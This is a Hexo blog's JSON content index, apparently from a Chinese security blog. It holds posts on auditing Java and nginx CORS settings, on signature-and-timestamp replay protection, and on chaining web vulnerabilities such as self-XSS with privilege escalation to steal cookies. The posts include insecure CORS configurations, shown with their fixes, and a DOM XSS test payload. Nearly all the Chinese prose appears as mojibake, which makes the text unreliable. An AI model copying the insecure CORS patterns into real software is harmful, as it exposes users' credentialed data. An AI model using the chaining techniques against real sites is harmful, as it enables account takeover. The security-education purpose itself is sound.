{"meta":{"title":"VK's blog","subtitle":"VK's blog","description":null,"author":"VK","url":"http://www.vkxss.top","root":"/"},"pages":[{"title":"404 Not Foundï¼šè¯¥é¡µæ— æ³•æ˜¾ç¤º","date":"2019-09-25T08:45:31.231Z","updated":"2019-09-25T08:45:31.231Z","comments":false,"path":"/404.html","permalink":"http://www.vkxss.top//404.html","excerpt":"","text":""},{"title":"å…³äº","date":"2019-10-10T09:29:30.628Z","updated":"2019-10-10T09:29:30.628Z","comments":false,"path":"about/index.html","permalink":"http://www.vkxss.top/about/index.html","excerpt":"","text":"ç”Ÿå¦‚è¼èšï¼Œå½“ç«‹é¸¿é¹„ä¹‹å¿—ã€‚å‘½å¦‚è–„çº¸ï¼Œå´æœ‰ä¸å±ˆä¹‹å¿ƒã€‚ä¹¾å¤æœªå®šï¼Œä½ æˆ‘çš†æ˜¯é»‘é©¬ã€‚ç¥ä½ æˆ‘é£é»„è…¾è¾¾å‰ç¨‹ä¼¼é”¦ã€‚"},{"title":"ä¹¦å•","date":"2019-09-08T07:27:54.732Z","updated":"2019-09-08T07:27:54.732Z","comments":false,"path":"books/index.html","permalink":"http://www.vkxss.top/books/index.html","excerpt":"","text":""},{"title":"åˆ†ç±»","date":"2019-09-08T06:03:31.259Z","updated":"2019-09-06T14:06:42.000Z","comments":false,"path":"categories/index.html","permalink":"http://www.vkxss.top/categories/index.html","excerpt":"","text":""},{"title":"å‹æƒ…é“¾æ¥","date":"2019-12-03T08:39:25.871Z","updated":"2019-12-03T08:39:25.871Z","comments":true,"path":"links/index.html","permalink":"http://www.vkxss.top/links/index.html","excerpt":"","text":"www.syst1m.com"},{"title":"Repositories","date":"2019-09-08T06:06:03.124Z","updated":"2019-09-06T14:06:42.000Z","comments":false,"path":"repository/index.html","permalink":"http://www.vkxss.top/repository/index.html","excerpt":"","text":""},{"title":"æ ‡ç­¾","date":"2019-09-08T06:03:31.300Z","updated":"2019-09-06T14:06:42.000Z","comments":false,"path":"tags/index.html","permalink":"http://www.vkxss.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Javaä»£ç å®¡è®¡-CORS","slug":"ä»£ç å®¡è®¡-Java-CORS","date":"2020-02-05T06:15:29.558Z","updated":"2020-02-08T16:20:27.608Z","comments":true,"path":"2020/02/05/ä»£ç å®¡è®¡-Java-CORS/","link":"","permalink":"http://www.vkxss.top/2020/02/05/ä»£ç å®¡è®¡-Java-CORS/","excerpt":"","text":"0x01ã€ é—®é¢˜èƒŒæ™¯å…¬å¸çš„é¡¹ç›®éœ€è¦å‰åç«¯åˆ†ç¦»ï¼Œvue+javaï¼Œè¿™æ—¶å€™å°±éœ€è¦æ”¯æŒCorsè·¨åŸŸè¯·æ±‚äº†.0x001 ä»€ä¹ˆæ˜¯Cors?CORS å…¨ç§°æ˜¯è·¨åŸŸèµ„æºå…±äº«ï¼ˆCross-Origin Resource Sharingï¼‰ï¼Œæ˜¯ä¸€ç§ AJAX è·¨åŸŸè¯·æ±‚èµ„æºçš„æ–¹å¼ï¼Œæ”¯æŒç°ä»£æµè§ˆå™¨ï¼ŒIEæ”¯æŒ10ä»¥ä¸Šã€‚ CORSä¸JSONPçš„ä½¿ç”¨ç›®çš„ç›¸åŒï¼Œä½†æ˜¯æ¯”JSONPæ›´å¼ºå¤§ã€‚JSONPåªæ”¯æŒGETè¯·æ±‚ï¼ŒCORSæ”¯æŒæ‰€æœ‰ç±»å‹çš„HTTPè¯·æ±‚ã€‚JSONPçš„ä¼˜åŠ¿åœ¨äºæ”¯æŒè€å¼æµè§ˆå™¨ï¼Œä»¥åŠå¯ä»¥å‘ä¸æ”¯æŒCORSçš„ç½‘ç«™è¯·æ±‚æ•°æ®ã€‚ ç®€å•æ¥è¯´Corså°±æ˜¯ç”¨æ¥è§£å†³è·¨åŸŸé—®é¢˜çš„ã€‚æ­¤å¤–è§£å†³çš„æ–¹å¼è¿˜æœ‰ï¼šNginxåå‘ä»£ç†ï¼ŒJsoupç­‰æ–¹å¼ã€‚ä¸è¿‡Nginxä¸ç¬¦åˆDevopsç†å¿µï¼Œä¸æ˜“ç»´æŠ¤ï¼Œè€ŒJsoupæ”¯æŒçš„è¯·æ±‚ç±»å‹åªæ”¯æŒGetè¯·æ±‚ã€‚Corsæ›´ä¸ºé€‚åˆï¼›0x002 ä»€ä¹ˆæ˜¯è·¨åŸŸï¼ŸåŒæºå°±æ˜¯æŒ‡ï¼šåŸŸåï¼Œåè®®ï¼Œç«¯å£ å‡ç›¸åŒ è·¨åŸŸå°±æ˜¯æŒ‡ï¼š åŸŸåï¼Œåè®®ï¼Œç«¯å£ å…¶ä¸­è‡³å°‘æœ‰ä¸€ä¸ªæ˜¯ä¸åŒçš„ï¼› å½“å‰ç«¯è¯·æ±‚åç«¯æ¥å£çš„æ—¶å€™ï¼Œå½“ç«¯å£å·ï¼Œipåœ°å€ç­‰ä¸ä¸€è‡´çš„æ—¶å€™ï¼Œä¸ºäº†å®‰å…¨æ€§è€ƒé‡ï¼Œè¯·æ±‚æ‰€å“åº”çš„æ•°æ®ä¸ä¼šè¢«å‰ç«¯å±•ç¤ºã€‚ç­‰äºè¯·æ±‚çš„æ•°æ®æ²¡æœ‰è¢«æ ‡è¯†ä¸ºå‹å†›ï¼Œæ²¡æœ‰è¢«è¯æ˜æ˜¯æ•Œæ˜¯å‹ï¼› ajaxè¯·æ±‚æ‰ä¼šå‡ºç°è·¨åŸŸ0x003 Corsèƒ½è§£å†³ä»€ä¹ˆé—®é¢˜ï¼Ÿé€šè¿‡åœ¨æœåŠ¡ç«¯é…ç½®Corsç›¸å…³çš„ä¸œè¥¿ï¼Œèƒ½è¯†åˆ«æ˜¯å¦ç»™äºˆè·¨åŸŸæƒé™ï¼Œç„¶åç»™äºˆèƒ½è·¨åŸŸçš„æ ‡è¯†ï¼Œé€šè¿‡æ­¤æ ‡è¯†ï¼Œæµè§ˆå™¨å°±å¯ä»¥æ¸²æŸ“è¿”å›æ¥çš„æ•°æ®å•¦~~0x02æ¡ˆä¾‹ä¸€. Corsåœ¨SpringCloudå¾®æœåŠ¡ä¸­çš„ä½¿ç”¨ï¼›0x001 ç¯å¢ƒï¼šJDK1.8 IDEA SpringCloudå¾®æœåŠ¡ ç½‘å…³ä½¿ç”¨Zuul0x002 ä»£ç ï¼š1234567891011121314151617181920212223242526272829package com.leyou.gateway.config;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.web.cors.CorsConfiguration;import org.springframework.web.cors.UrlBasedCorsConfigurationSource;import org.springframework.web.filter.CorsFilter;@Configurationpublic class CorsConfiguration &#123; @Bean public CorsFilter corsFilter()&#123; //é…ç½®åˆå§‹åŒ–å¯¹è±¡ CorsConfiguration configuration=new CorsConfiguration(); //å…è®¸è·¨åŸŸçš„åŸŸåï¼Œå¦‚æœè¦æºå¸¦cookieï¼Œä¸èƒ½å†™* ã€‚ *ï¼šä»£è¡¨æ‰€æœ‰çš„åŸŸåéƒ½å¯ä»¥è®¿é—® configuration.addAllowedOrigin(&quot;http://localhost:9001&quot;); configuration.setAllowCredentials(true); configuration.addAllowedMethod(&quot;*&quot;); //ä»£è¡¨æ‰€æœ‰çš„è¯·æ±‚æ–¹æ³• configuration.addAllowedHeader(&quot;*&quot;); //å…è®¸æºå¸¦ä»»ä½•å¤´ä¿¡æ¯ //åˆå§‹åŒ–corsé…ç½®æºå¯¹è±¡ UrlBasedCorsConfigurationSource configurationSource=new UrlBasedCorsConfigurationSource(); configurationSource.registerCorsConfiguration(&quot;/**&quot;,configuration); //è¿”å›corsFilterå®ä¾‹ï¼Œå‚æ•°:corsé…ç½®æºå¯¹è±¡ return new CorsFilter(configurationSource); &#125;&#125; 0x003 ä»€ä¹ˆæ˜¯zuulå¾®æœåŠ¡ç½‘å…³ï¼š https://www.jianshu.com/p/29e9c91e3f3e https://www.jianshu.com/p/7bc06a64519b 0x03 ã€HTTP headerã€‘ã€ã€Access-Control-Allow-Credentialsã€‘è·¨åŸŸAjaxè¯·æ±‚æ—¶æ˜¯å¦å¸¦Cookieçš„è®¾ç½® å‰ç«¯å‘èµ·AJAXè¯·æ±‚éƒ½ä¼šå—åˆ°åŒæºç­–ç•¥ï¼ˆCORSï¼‰çš„é™åˆ¶ã€‚å‘èµ·AJAXè¯·æ±‚çš„æ–¹æ³•ï¼š 1234ç¬¬ä¸€ä¸ªæ˜¯åŸç”Ÿæ–¹æ³• XMLHttpRequestç¬¬äºŒä¸ªæ˜¯jQueryå°è£…çš„ JQueryçš„$.ajaxç¬¬ä¸‰ä¸ªæ˜¯fetchæ˜¯ä¸“é—¨å°è£…çš„åº“ Fetchç¬¬å››ä¸ªæ˜¯axios å‰ç«¯åœ¨å‘èµ·AJAXè¯·æ±‚æ—¶ï¼ŒåŒåŸŸæˆ–è€…ç›´æ¥è®¿é—®çš„æƒ…å†µä¸‹ï¼Œå› ä¸ºæ²¡æœ‰è·¨åŸŸçš„éœ€æ±‚ï¼Œæ‰€ä»¥Requestçš„Headerä¸­çš„Originä¸ºç©ºã€‚æ­¤æ—¶ï¼Œå¦‚æœåç«¯ä»£ç æ˜¯response.setHeader(â€œAccess-Control-Allow-Originâ€, origin)ï¼Œé‚£ä¹ˆResponseçš„headerä¸­ä¸ä¼šå‡ºç°Access-Control-Allow-Originï¼Œå› ä¸ºOriginä¸ºç©ºã€‚ æ³¨æ„å½“æˆ‘ä»¬çš„å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯äº¤äº’çš„æ—¶å€™ä½¿ç”¨çš„æ˜¯ tokenï¼Œé€šè¿‡ Authorizationå¤´å‘é€åˆ°æœåŠ¡ç«¯ï¼Œå¹¶æ²¡æœ‰ä½¿ç”¨åˆ° cookieæ—¶ï¼Œæ‰€ä»¥å®¢æˆ·ç«¯æ²¡æœ‰å¿…è¦è®¾ç½® withCredentials: true 0x001 æ— Cookieè·¨åŸŸAjaxè¯·æ±‚ å®¢æˆ·ç«¯ 123456789- ä»¥ jQuery çš„ ajax ä¸ºä¾‹ï¼š$.ajax(&#123; url : &apos;http://remote.domain.com/corsrequest&apos;, data : data, dataType: &apos;json&apos;, type : &apos;POST&apos;, crossDomain: true, contentType: &quot;application/json&quot;, // POSTæ—¶å¿…é¡» ä¸»è¦æ³¨æ„çš„æ˜¯å‚æ•° crossDomain: trueã€‚å‘é€Ajaxæ—¶ï¼ŒRequest header ä¸­ä¼šåŒ…å«è·¨åŸŸçš„é¢å¤–ä¿¡æ¯ï¼Œä½†ä¸ä¼šå«cookieã€‚ æœåŠ¡å™¨ç«¯ è·¨åŸŸçš„å…è®¸ä¸»è¦ç”±æœåŠ¡å™¨ç«¯æ§åˆ¶ã€‚æœåŠ¡å™¨ç«¯é€šè¿‡åœ¨å“åº”çš„ header ä¸­è®¾ç½® Access-Control-Allow-Origin åŠç›¸å…³ä¸€ç³»åˆ—å‚æ•°ï¼Œæä¾›è·¨åŸŸè®¿é—®çš„å…è®¸ç­–ç•¥ã€‚ 1234567891011ä»¥Javaä¸ºä¾‹ï¼š/*** Spring Controllerä¸­çš„æ–¹æ³•ï¼š*/ @RequestMapping(value = &quot;/corsrequest&quot;) @ResponseBody public Map&lt;String, Object&gt; mainHeaderInfo(HttpServletResponse response) &#123; response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;); ... &#125; é€šè¿‡åœ¨å“åº” header ä¸­è®¾ç½® æ˜Ÿå· æ¥å…è®¸æ¥è‡ªæ‰€æœ‰åŸŸçš„è·¨åŸŸè¯·æ±‚è®¿é—®ã€‚ 1response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;); åªå…è®¸æ¥è‡ªç‰¹å®šåŸŸ http://my.domain.cn:8080 çš„è·¨åŸŸè®¿é—® 1response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;http://my.domain.cn:8080&quot;); è¾ƒçµæ´»çš„è®¾ç½®æ–¹å¼ï¼Œå…è®¸æ‰€æœ‰åŒ…å« mydomain.com çš„åŸŸåè®¿é—®.ä»å®‰å…¨çš„è§’åº¦å»è€ƒè™‘ï¼Œå¹¶ä¸å»ºè®®ä½¿ç”¨ï¼Œå› ä¸ºæ”»å‡»è€…å¾ˆå®¹æ˜“ç»•è¿‡ã€‚ 12if(request.getHeader(&quot;Origin&quot;).contains(&quot;mydomain.com&quot;)) &#123; response.setHeader(&quot;Access-Control-Allow-Origin&quot;, request.getHeader(&quot;Origin&quot;)); 0x002 å¸¦Cookieçš„è·¨åŸŸAjaxè¯·æ±‚ å®¢æˆ·ç«¯ 1234567891011$.ajax(&#123; url : &apos;http://remote.domain.com/corsrequest&apos;, data : data, dataType: &apos;json&apos;, type : &apos;POST&apos;, xhrFields: &#123; withCredentials: true &#125;, crossDomain: true, contentType: &quot;application/json&quot;, é€šè¿‡è®¾ç½® withCredentials: true ï¼Œå‘é€Ajaxæ—¶ï¼ŒRequest headerä¸­ä¾¿ä¼šå¸¦ä¸Š Cookie ä¿¡æ¯ã€‚ æœåŠ¡å™¨ç«¯ ç›¸åº”çš„ï¼Œå¯¹äºå®¢æˆ·ç«¯çš„å‚æ•°ï¼ŒæœåŠ¡å™¨ç«¯ä¹Ÿéœ€è¦è¿›è¡Œè®¾ç½®ï¼š 123456789* Spring Controllerä¸­çš„æ–¹æ³•ï¼š @RequestMapping(value = &quot;/corsrequest&quot;) @ResponseBody public Map&lt;String, Object&gt; getUserBaseInfo(HttpServletResponse response) &#123; if(request.getHeader(&quot;Origin&quot;).contains(&quot;woego.cn&quot;)) &#123; response.setHeader(&quot;Access-Control-Allow-Origin&quot;, request.getHeader(&quot;Origin&quot;)); &#125; response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;); ... å¯¹åº”å®¢æˆ·ç«¯çš„ xhrFields.withCredentials: true å‚æ•°ï¼ŒæœåŠ¡å™¨ç«¯é€šè¿‡åœ¨å“åº” header ä¸­è®¾ç½® Access-Control-Allow-Credentials = true æ¥è¿è¡Œå®¢æˆ·ç«¯æºå¸¦è¯ä¹¦å¼è®¿é—®ã€‚é€šè¿‡å¯¹ Credentials å‚æ•°çš„è®¾ç½®ï¼Œå°±å¯ä»¥ä¿æŒè·¨åŸŸ Ajax æ—¶çš„ Cookieã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼š 12æœåŠ¡å™¨ç«¯ Access-Control-Allow-Credentials = trueæ—¶ï¼Œå‚æ•°Access-Control-Allow-Origin çš„å€¼ä¸èƒ½ä¸º &apos;*&apos; ã€‚ 0x04 Nginxå¯¼è‡´CorsåŠä¿®å¤æ–¹æ¡ˆ å­˜åœ¨æ¼æ´é…ç½®ï¼š 123456789add_header Access-Control-Allow-Origin *;add_header Access-Control-Allow-Methods GET,POST,PUT,DELETE,OPTIONS;add_header &apos;Access-Control-Allow-Credentials&apos; &apos;true&apos;;oradd_header &apos;Access-Control-Allow-Origin&apos; &quot;$http_origin&quot;;add_header Access-Control-Allow-Methods GET,POST,PUT,DELETE,OPTIONS;add_header &apos;Access-Control-Allow-Credentials&apos; &apos;true&apos;; ä¿®å¤æ–¹æ¡ˆéœ€è¦é™åˆ¶originï¼š 12add_header &apos;Access-Control-Allow-Origin&apos; https://test.joychou.org;add_header &apos;Access-Control-Allow-Origin&apos; http://test.joychou.org;","categories":[{"name":"JAVA","slug":"JAVA","permalink":"http://www.vkxss.top/categories/JAVA/"}],"tags":[{"name":"Javaä»£ç å®¡è®¡","slug":"Javaä»£ç å®¡è®¡","permalink":"http://www.vkxss.top/tags/Javaä»£ç å®¡è®¡/"}]},{"title":"javaé€šè¿‡signç­¾å+æ—¶é—´æˆ³çš„æ–¹å¼é˜²æ­¢restæ¥å£è¢«æ¶æ„æŠ“åŒ…è°ƒç”¨å’Œé‡æ”¾ï¼ˆè½¬ï¼‰","slug":"APP-éªŒç­¾åä¸é‡æ”¾","date":"2020-01-16T08:10:57.352Z","updated":"2020-01-19T07:37:14.458Z","comments":true,"path":"2020/01/16/APP-éªŒç­¾åä¸é‡æ”¾/","link":"","permalink":"http://www.vkxss.top/2020/01/16/APP-éªŒç­¾åä¸é‡æ”¾/","excerpt":"","text":"javaé€šè¿‡signç­¾å+æ—¶é—´æˆ³çš„æ–¹å¼é˜²æ­¢restæ¥å£è¢«æ¶æ„æŠ“åŒ…è°ƒç”¨å’Œé‡æ”¾ è¦é¿å…æ¥å£è¢«æ¶æ„åˆ©ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç½‘å…³è¿æ¥å™¨è¿›è¡ŒéªŒç­¾çš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯signã€‚ä½†æ˜¯æ”»å‡»è€…è¿˜å¯ä»¥é‡æ”¾æ•°æ®åŒ…ï¼Œé‚£å…·ä½“åº”è¯¥è¦æ€ä¹ˆåšå‘¢ï¼Ÿä¸‹é¢æˆ‘æä¾›3ä¸ªæ–¹æ³•ï¼Œä¾›å¤§å®¶å‚è€ƒã€‚åŒæ—¶å†æ­¤è®°å½•ä¸‹ï¼Œæ–¹ä¾¿ç¿»é˜…ã€‚ https://blog.csdn.net/u014270696/article/details/97372584 æ–¹æ³•1ï¼šè¯·æ±‚æ¥å£çš„å‚æ•°ä¸­æ·»åŠ æ—¶é—´æˆ³ å…·ä½“å®ç°åŸç†ï¼šæ¯æ¬¡å®¢æˆ·ç«¯å‘é€è¯·æ±‚æ—¶ï¼Œè·å–å½“å‰æ—¶é—´æˆ³ï¼Œå½“å‚æ•°ä¸€åŒå‘é€åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨æ‹¦æˆªè¯¥è¯·æ±‚ï¼Œè·å–æœåŠ¡å™¨ä¸Šå½“å‰æ—¶é—´æˆ³å’Œå®¢æˆ·ç«¯è¯·æ±‚ä¸­çš„æ—¶é—´æˆ³è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœä¸¤ä¸ªæ—¶é—´æˆ³ç›¸å·®è¶…è¿‡60sçš„è¯å°±è®¤å®šä¸ºéæ³•è¯·æ±‚ï¼Œå› ä¸ºä¸€èˆ¬ä¸€æ¬¡æ­£å¸¸çš„httpè¯·æ±‚å‘é€åˆ°æœåŠ¡å™¨ä¸ä¼šè¶…è¿‡60ç§’ï¼Œæ‰€ä»¥å¯ä»¥è¿™æ ·åšã€‚ è¿™æ ·å¯ä»¥åšåˆ°ç®€å•çš„é˜²é‡æ”¾ï¼Œä½†æ˜¯å¹¶ä¸èƒ½ çœŸçš„è§£å†³é‡æ”¾çš„é—®é¢˜ï¼Œæ—¶é—´æˆ³å¦‚æœè¢«ä¿®æ”¹ä¸ºå½“å‰æ—¶é—´æˆ³çš„è¯ã€‚é‚£è¿™ç§æ–¹å¼å°±å¤±æ•ˆäº†ã€‚ è¿™æ—¶å€™å°±éœ€è¦å¦å¤–ä¸€ç§æ–¹å¼äº† æ–¹æ³•2ï¼šè¯·æ±‚æ¥å£çš„å‚æ•°ä¸­æ·»åŠ signç­¾å å…·ä½“å®ç°åŸç†ï¼šä½¿ç”¨ç­¾åéªŒè¯ï¼Œä¿è¯æ¯æ¬¡è¯·æ±‚æ—¶å€™ç­¾ååªèƒ½ä½¿ç”¨ä¸€æ¬¡ã€‚ å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯çº¦å®šä¸€ä¸ªç”Ÿæˆç­¾åä¸²çš„ç®—æ³•ï¼Œå¯ä»¥ç”±å®¢æˆ·ç«¯ip+åŠ å¯†å¯†é’¥+å½“å‰æ—¶é—´æˆ³è¿›è¡ŒMD5åŠ å¯†ç”Ÿæˆï¼Œå‰ç«¯ç”Ÿæˆç­¾åä¸²åï¼Œè·Ÿéšå‚æ•°ä¸€èµ·å‘é€åˆ°åå°è§£å¯†ï¼Œå¹¶å°†è¯¥ç­¾åä¸²ä¿å­˜åœ¨redisä¸­ï¼Œä¸‹æ¬¡è¯·æ±‚çš„æ—¶å€™ï¼Œå…ˆåœ¨redisä¸­å–æŸ¥æ‰¾æ˜¯å¦æœ‰è¯¥ç­¾åä¸²ï¼Œå¦‚æœæœ‰ï¼Œåˆ™è¯´æ˜æ˜¯éæ­£å¸¸è¯·æ±‚ï¼Œè¿™æ—¶å€™å°±å¯ä»¥è®¤å®šä¸ºéæ³•æ“ä½œã€‚ ä½†æ˜¯è¿™æ ·ä¹Ÿä¼šå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œä¹Ÿå°±æ˜¯éšç€æ—¶é—´çš„æ¨ç§»ï¼Œredisä¸­ä¼šä¿å­˜è¶Šæ¥è¶Šå¤šçš„è¿™æ ·çš„signç­¾åï¼Œå¯¹äºæœåŠ¡å™¨èµ„æºæ¶ˆè€—æ˜¯ä¸€ç¬”ä¸å°çš„å¼€é”€ï¼Œè¿™æ—¶å€™éœ€è¦æ˜¯æˆ‘ä»¬å»æ¸…ç†äº†ï¼Œå½“ç„¶æˆ‘ä»¬å¯ä»¥é€‰æ‹©ç»™æ¯ä¸ªsignè®¾å®šä¸€ä¸ªè¿‡æœŸæ—¶é—´ï¼Œè®©ä»–è‡ªåŠ¨æ¸…ç†ï¼Œæ¯”å¦‚è¯´è®¾ç½®1å¤©çš„æœ‰æ•ˆæ—¶é•¿ï¼Œè¿™æ ·å½“å¤©å°±ä¸èƒ½ä½¿ç”¨è¿™ä¸ªsignæ¥è¯·æ±‚äº†ï¼Œä½†æ˜¯ä¸€å¤©åè¿˜æ˜¯å¯ä»¥ç»§ç»­ä½¿ç”¨ã€‚è¿™æ ·ä¹Ÿæœ‰éšæ‚£ã€‚è¿™æ—¶å€™å¯ä»¥ç»“åˆæ—¶é—´æˆ³éªŒè¯å’Œsignç­¾åéªŒè¯ã€‚ æ–¹æ³•3ï¼šè¯·æ±‚æ¥å£çš„å‚æ•°ä¸­æ·»åŠ signç­¾å+æ—¶é—´æˆ³ï¼ˆæ¨èï¼‰ å…·ä½“å®ç°åŸç†ï¼šå®¢æˆ·ç«¯ç”ŸæˆMD5åŠ å¯†ç­¾åä¸²ï¼Œå’Œå½“å‰æ—¶é—´æˆ³è·Ÿéšè¯·æ±‚çš„å‚æ•°ä¸€èµ·å‘é€åˆ°åå°ï¼Œåå°è·å–ç­¾åè¿›è¡Œè§£å¯†ï¼Œç„¶åä¿å­˜åˆ°redisä¸­å¹¶è®¾ç½®ä¸€ä¸ªå¤±æ•ˆæ—¶é•¿ï¼ˆ60sï¼‰ï¼Œåˆ™60så†…ä¸èƒ½ä½¿ç”¨ç›¸åŒçš„signå‘é€è¯·æ±‚ï¼Œç„¶åè·å–ç³»ç»Ÿå½“å‰æ—¶é—´æˆ³å’Œå‰ç«¯å‘é€è¿‡æ¥çš„æ—¶é—´æˆ³åšæ¯”è¾ƒï¼Œå¦‚æœä¸¤è€…ç›¸å·®è¶…è¿‡60sï¼Œåˆ™è®¤å®šä¸ºéæ³•æ“ä½œã€‚ è¿™ç§æ–¹å¼æ—¢èƒ½ä¿è¯é˜²æ­¢è¯·æ±‚é‡æ”¾ï¼Œåˆèƒ½æœ‰æ•ˆèŠ‚çœæœåŠ¡å™¨èµ„æºï¼Œæ¨èä½¿ç”¨ã€‚ Java ä»£ç å±‚","categories":[{"name":"APP","slug":"APP","permalink":"http://www.vkxss.top/categories/APP/"}],"tags":[{"name":"APPæ¸—é€æµ‹è¯•","slug":"APPæ¸—é€æµ‹è¯•","permalink":"http://www.vkxss.top/tags/APPæ¸—é€æµ‹è¯•/"}]},{"title":"æ¼æ´æŒ–æ˜çš„ç»„åˆæ‹³","slug":"æ¸—é€æµ‹è¯•-æ¼æ´æŒ–æ˜çš„ç»„åˆæ‹³","date":"2019-11-15T07:30:08.000Z","updated":"2020-01-09T09:25:59.973Z","comments":true,"path":"2019/11/15/æ¸—é€æµ‹è¯•-æ¼æ´æŒ–æ˜çš„ç»„åˆæ‹³/","link":"","permalink":"http://www.vkxss.top/2019/11/15/æ¸—é€æµ‹è¯•-æ¼æ´æŒ–æ˜çš„ç»„åˆæ‹³/","excerpt":"","text":"æ¼æ´æŒ–æ˜çš„ç»„åˆæ‹³æ¡ˆä¾‹ä¸€ URLè·³è½¬+CSRFæ¼æ´ æ¡ä»¶ï¼šæ ¡éªŒrefererå€¼ã€å­˜åœ¨URLè·³è½¬æ¼æ´ã€å­˜åœ¨CSRFæ¼æ´ å½“ç½‘ç«™æ ¡éªŒRefererå€¼ï¼Œæ— CSRG_token,çš„æ—¶å€™ã€‚æˆ‘ä»¬é…åˆURLè·³è½¬å®Œæˆæ”»å‡»ã€‚æ¥æå‡æ¼æ´å±å®³æ€§ æ¡ˆä¾‹äºŒ SELF-XSS+CSRFæ¼æ´ æ¡ä»¶ï¼šå­˜åœ¨CSRFæ¼æ´ å¯ä»¥åˆ©ç”¨csrfå†™å…¥å‹ç¯¡æ”¹ä»–äººä¿¡æ¯ã€‚ä¾‹å¦‚åˆ©ç”¨csrfåšä¸ªé’“é±¼ç•Œé¢ï¼Œæ¥ä¿®æ”¹ä»–äººçš„ä¿¡æ¯ï¼Œæ¯”å¦‚ä¿®æ”¹å¤‡æ³¨åã€é‚®ç®±ã€æ‰‹æœºå·ã€‚æœ‰çš„ä¸šåŠ¡éœ€è¦äºŒæ¬¡éªŒè¯ã€‚å½“æˆ‘ä»¬ä¿®æ”¹ç”¨æˆ·æ‰‹æœºå·æˆ–é‚®ç®±åã€‚å¯¼è‡´ç”¨æˆ·æ— æ³•ç™»é™†ã€‚æ¥æå‡æ¼æ´å±å®³æ€§ã€‚ æ¡ˆä¾‹ä¸‰ SELF-XSS+è¶Šæƒæ¼æ´ æ¡ä»¶ï¼šé€šè¿‡ç¯¡æ”¹IDï¼Œå¯ä»¥è¶Šæƒã€‚ å½“æˆ‘ä»¬çš„xssåªèƒ½è‡ªå·±è§¦å‘çš„æ—¶å€™ï¼Œä»–ä¼šæœ‰ç‚¹é¸¡è‚‹ï¼Œæ‰€ä»¥é…åˆè¶Šæƒè·å–å…¶ä»–äººçš„cookieã€‚æˆ‘ä»¬è¶Šæƒä¿®æ”¹ä»–äººä¿¡æ¯åï¼Œè§¦å‘ä»£ç ã€‚æˆ‘ä»¬æ”¶åˆ°çš„cookieä¿¡æ¯å°±æ˜¯å…¶ä»–äººçš„å•¦ã€‚æ¥æå‡æ¼æ´å±å®³æ€§ã€‚ æ¡ˆä¾‹å›› URLè·³è½¬+DOMXSS æˆ‘ä»¬åœ¨æµ‹è¯•çš„æ—¶å€™æ€»ä¼šé‡åˆ°ç±»ä¼¼returnurlè¿™æ ·çš„å‚æ•°ï¼Œåè¾¹çš„å€¼æ˜¯è·³è½¬çš„åœ°å€ï¼Œå½“å¼€å‘æ²¡æœ‰åšç™½åå•çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±å®ç°ä»»æ„URLè·³è½¬ï¼Œæˆ–è€…æœ‰çš„è§¦å‘æ¡ä»¶æ˜¯éœ€è¦ç”¨æˆ·ç™»é™†åè¿›è¡Œè·³è½¬çš„ã€‚ä½†æˆ‘ä»¬æœ‰æ—¶å€™ä¼šç–å¿½å¦ä¸€ä¸ªæµ‹è¯•ç‚¹ï¼Œå°±æ˜¯DOMå‹XSSï¼šâ€œJavaScriptï¼šalertï¼ˆ/xss/ï¼‰//â€ã€‚å¼€å‘åŒæ ·æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦è¿›è¡Œè¿‡æ»¤ã€‚ æ¡ˆä¾‹äº” æ–‡ä»¶ä¸Šä¼ +æ¡ä»¶ç«äº‰=RCE ç°åœ¨å¤§éƒ¨åˆ†å‚å•†éƒ½å–œæ¬¢æŠŠä¸šåŠ¡ä¸­ä¸Šä¼ çš„å›¾ç‰‡ï¼Œå­˜å‚¨åœ¨äº‘ä¸Šã€‚æœ‰é®æ ·ä¸€ä¸ªæ¡ˆä¾‹ï¼Œå½“æŠŠä¸Šä¼ çš„å›¾ç‰‡å…ˆä¼ åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å†ä¼ åˆ°äº‘ä¸Šï¼Œè¿™æ ·å°±å¯ä»¥åˆ©ç”¨æ¡ä»¶ç«äº‰è¿›è¡ŒRCEæ”»å‡»ã€‚ æ¡ˆä¾‹å…­ ç›®å½•éå†+æ–‡ä»¶ä¸Šä¼ =RCE æ¡ˆä¾‹ä¸ƒ æ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶åXSS https://cloud.tencent.com/developer/article/1165636 æ¡ˆä¾‹å…« æ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶å†…å®¹XSS https://xz.aliyun.com/t/6362 æ¡ˆä¾‹ä¹ æ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶åæ³¨å…¥ http://kfbiji.com/article/d7e00b56df31a053 æ¡ˆä¾‹å æ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶å†…å®¹æ³¨å…¥ https://paper.seebug.org/256/#sql-ii æ¡ˆä¾‹åä¸€ Self-XSS+CSRF=Reflected-XSS -ä¾‹å¦‚åœ¨è¯„è®ºã€ç™»å½•ã€æ–‡ä»¶ä¸Šä¼ ç­‰å¤„çš„Self-XSSï¼Œç»“åˆCSRFå¯å˜ä¸ºåå°„å‹XSSã€‚ 